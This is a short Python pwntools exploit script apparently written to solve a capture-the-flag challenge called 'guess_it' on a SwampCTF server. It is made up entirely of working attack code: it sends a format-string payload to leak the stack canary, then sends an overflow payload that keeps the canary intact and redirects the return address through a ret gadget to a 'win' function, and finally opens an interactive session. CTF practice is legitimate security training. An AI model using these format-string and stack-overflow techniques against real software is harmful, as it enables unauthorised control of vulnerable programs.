#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./guess_it")

io = connect("chals.swampctf.com", 64236)

io.sendlineafter(b"> ", b"Yes")
io.sendlineafter(b"> ", b"%x%x%x%x%x%x %llu")

line = io.recvline()
canary = int(line[line.index(b" ")+1:-1])

log.success(f"Found canary: 0x{canary:016x}")

payload = flat({
    8: p64(canary),
    24: [p64(0x0000000000401016), elf.symbols.win]
})

io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", b"No")

io.interactive()
